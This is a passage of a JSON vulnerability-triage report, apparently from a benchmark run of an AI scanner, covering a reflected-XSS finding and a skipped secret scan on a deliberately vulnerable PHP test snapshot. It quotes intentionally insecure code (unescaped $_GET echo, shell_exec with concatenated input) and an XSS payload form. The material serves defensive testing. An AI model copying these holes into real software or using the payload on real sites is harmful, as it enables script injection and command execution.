+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-a48bdbb0ebc0c939-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-a48bdbb0ebc0c939-model-a48bdbb0ebc0c939-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-a48bdbb0ebc0c939-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-a48bdbb0ebc0c939-ai",
+            "finding_id": "model-a48bdbb0ebc0c939",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+              "base_score": 5.1,
+              "qualitative": "medium",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 5.1,
+              "base_rating": "Medium",
+              "overall_rating": "Medium",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.5,
+            "assumptions": [
+              "The file is served by a web server that executes PHP rather than returning source; a static-source deployment would not be exploitable, though no such deployment is evidenced.",
+              "The endpoint is reachable without authentication -- no auth guard, include, or framework middleware is present in this 3-line file, but no routing configuration was available to confirm exposure.",
+              "Impact on confidentiality is rated L rather than H because the file contains no session handling and the presence of session cookies or CSRF tokens in the origin could not be verified from available source.",
+              "A second model observation (model-ed0a142e6393612e) describes the same line 2 sink; the two should be deduplicated rather than counted as separate vulnerabilities.",
+              "Semgrep and CodeQL coverage for this file is unverified/unsupported, so no corroborating tool evidence exists for any PHP file in this snapshot."
+            ],
+            "rationale": "**Confirmed: reflected XSS, true positive.** The scanner's observation was hedged (\"evidence is unknown\", line 1 placeholder), but the source is now read directly.\n\n`web/vuln_xss.php` (3 lines, whole file):\n\n```php\n<?php\necho \"<div>\" . $_GET[\"msg\"] . \"</div>\";\n?>\n```\n\nThe sink is an unescaped `$_GET[\"msg\"]` concatenated into the response body. Source-to-sink is a single statement with no sanitizer, no encoding, and no intervening logic. The paired `web/safe_xss.php` confirms the intended fix by contrast: it passes the same parameter through `htmlspecialchars($_GET[\"msg\"], ENT_QUOTES, \"UTF-8\")`, so this file's omission is the defect, not an accident of framing.\n\nTwo further details matter for the assessment:\n\n- **No CSP or compensating headers.** A grep across all eight PHP files for `header(`, `Content-Security-Policy`, `X-XSS-Protection` and `Content-Type` returned zero hits, and the repo root contains only these PHP files -- no web-server config to supply a header instead. Modern browsers ignore `X-XSS-Protection` anyway, so no client-side mitigation is in play.\n- **Context is plain HTML text**, not an attribute or script block, so any HTML payload works. `?msg=<script>...</script>` executes in the site's origin.\n\nScanner coverage is thin, and I should be explicit about that rather than let the confirmed finding imply tool agreement: Semgrep is not installed on this host (`semgrep not found on PATH`), CodeQL does not support PHP dataflow at all, `check_coverage` returned an empty object, and the stored finding carries `evidence_strength: \"none\"`. The confirmation rests on my own reading of the file, which is stronger than the scanner evidence, not weaker. Note also that a second model observation (`model-ed0a142e6393612e`) covers the same line -- if both are triaged independently they will double-count one defect.\n\nOn severity: exploitation needs a victim to click a crafted URL, which is `UI:A` and `AC:L`. The scope change is genuine, since the attacker's script r",
+            "evidence_refs": [
+              "model-a48bdbb0ebc0c939-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-a48bdbb0ebc0c939",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:41:58.360026Z",
+            "metadata": {
+              "tool_calls_made": 10,
+              "total_tokens": 46352,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-7230607c40e80064",
+      "run_id": "run-1580e0037fac4a13944363313403b149",
+      "fingerprint": "7230607c40e800644f269b82fb18240589809d00b6d1ec3f3cbfb086af99d124",
+      "title": "Secret scan not executed; no hardcoded credential, API key, private key or JWT finding is confirmable",
+      "description": "The requested focus was hardcoded credentials, API keys, private keys and JWT tokens. run_secret_scan returned status 'skipped' because gitleaks is not on PATH, with 0 eligible units and 0 observations, so there is zero secret-scan evidence in this snapshot. None of the eight listed PHP files can be shown to contain a credential from the available output, and none of the eight file bodies was read. Reporting this as 'unknown', not 'safe'. No credential, key or token is invented here; the file and line identify where the scan gap applies (the only files known to exist), not a located secret.",
+      "cwe_category": "CWE-798",
+      "additional_cwe_labels": [],
+      "severity": "info",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-7230607c40e80064-obs",
+          "run_id": "run-1580e0037fac4a13944363313403b149",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-798",
+          "severity": "info",
+          "native_severity": null,
+          "message": "The requested focus was hardcoded credentials, API keys, private keys and JWT tokens. run_secret_scan returned status 'skipped' because gitleaks is not on PATH, with 0 eligible units and 0 observations, so there is zero secret-scan evidence in this snapshot. None of the eight listed PHP files can be shown to contain a credential from the available output, and none of the eight file bodies was read. Reporting this as 'unknown', not 'safe'. No credential, key or token is invented here; the file and line identify where the scan gap applies (the only files known to exist), not a located secret.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "web/vuln_cmd.php",
+            "language": "php",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- web/vuln_cmd.php (lines 1-4) ---\n1: <?php\n2: $host = $_GET['host'];\n3: echo shell_exec(\"ping -c 1 \" . $host);\n4: ?>"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:40:24.337214Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-7230607c40e80064-obs"
+      ],
+      "created_at": "2026-11-25T13:40:24.337214Z",
+      "updated_at": "2026-11-25T13:40:24.337214Z",
+      "metadata": {
+        "title": "Secret scan not executed; no hardcoded credential, API key, private key or JWT finding is confirmable",
+        "rationale": "The requested focus was hardcoded credentials, API keys, private keys and JWT tokens. run_secret_scan returned status 'skipped' because gitleaks is not on PATH, with 0 eligible units and 0 observations, so there is zero secret-scan evidence in this snapshot. None of the eight listed PHP files can be shown to contain a credential from the available output, and none of the eight file bodies was read. Reporting this as 'unknown', not 'safe'. No credential, key or token is invented here; the file and line identify where the scan gap applies (the only files known to exist), not a located secret.",
+        "evidence": "unknown",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-7230607c40e80064",
+          "finding_id": "model-7230607c40e80064",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-7230607c40e80064-model-7230607c40e80064-obs",
+            "ev-model-7230607c40e80064-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:42:26.998378Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "assessment_id": "assess-model-7230607c40e80064-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-7230607c40e80064-model-7230607c40e80064-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-7230607c40e80064-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-7230607c40e80064-ai",
+            "finding_id": "model-7230607c40e80064",
+            "run_id": "run-1580e0037fac4a13944363313403b149",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.5,
+            "assumptions": [
+              "The snapshot (8 files, all web/*.php) is a representative subset of the project under review, not the full application tree.",
+              "web/vuln_sql.php uses an undefined $conn, implying DB connection setup (a plausible location for hardcoded credentials) lives outside the snapshot and was not assessed.",
+              "No git history was scanned; run_secret_scan was invoked with scan_git_history false.",
+              "Pattern-based grep for common credential markers is not equivalent to entropy-based secret detection."
+            ],
+            "rationale": "## Assessment\n\nThe finding's core claim holds: no secret-scan evidence exists in this snapshot. I reproduced that, and then went past it by reading the code, which narrows \"unknown\" considerably.\n\n**What I confirmed this turn**\n\n- `run_secret_scan` on `.` returned `status: \"skipped\"` with the warning `gitleaks: gitleaks not found on PATH`, 0 eligible units, 0 observations. Re-running does not help; the tool is absent, not misconfigured.\n- `run_semgrep_scan` on `web` with `p/secrets` also failed (`semgrep: semgrep not found on PATH`), so the fallback rule pack was unavailable too. No automated secret coverage at all.\n- `query_scanner_findings` for gitleaks: 0 results. `check_coverage` for CWE-798: empty record, so there is no coverage bookkeeping for this CWE either.\n- `grep_code` across `*.php` for `password|secret|api_key|token|Bearer|BEGIN PRIVATE KEY|AKIA|ghp_|sk_live|JWT|hash_hmac|base64_decode|mysqli_connect|new PDO` returned **zero hits**. That is the strongest evidence in this assessment, but note the limits: it is a pattern grep over a glob limited to `*.php`, and it cannot prove absence of an unlabelled high-entropy literal.\n- The snapshot contains exactly eight files, all under `web/`, all PHP. No `.env`, no config, no key material, no `docker-compose`, no CI YAML, no git history.\n\n**What I read**\n\nI opened all eight files in full. They are 3-4 lines each:\n\n- `web/vuln_cmd.php` (the file cited in the finding) contains `shell_exec(\"ping -c 1 \" . $host)`. The only literal is the command string `ping -c 1`.\n- `web/safe_cmd.php`: `uname -a`. `web/safe_json.php`: `json_decode($_COOKIE['session'], true)`. `web/safe_sql.php`: prepared statement with `?` placeholder. `web/safe_xss.php`: `htmlspecialchars(...)`. `web/vuln_deser.php`: `unserialize($_COOKIE['session'])`. `web/vuln_sql.php`: string-concatenated `mysqli_query`. `web/vuln_xss.php`: unescaped echo.\n\nNot one of them contains a credential, key, token, connection string or auth header. That converts the cit",
+            "evidence_refs": [
+              "model-7230607c40e80064-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-7230607c40e80064",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:42:26.996397Z",
+            "metadata": {
+              "tool_calls_made": 15,
+              "total_tokens": 41824,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    }
+  ],
+  "advisory_routing": {
+    "is_advisory_only": true,
+    "affects_finding_status": false,
+    "note": "Advisory recommendations never set or change a finding status; IndependentValidator remains the sole status owner.",
+    "route_counts": {},
+    "routed": 0,
+    "unavailable": 0,
+    "payloads": []
+  }
+}
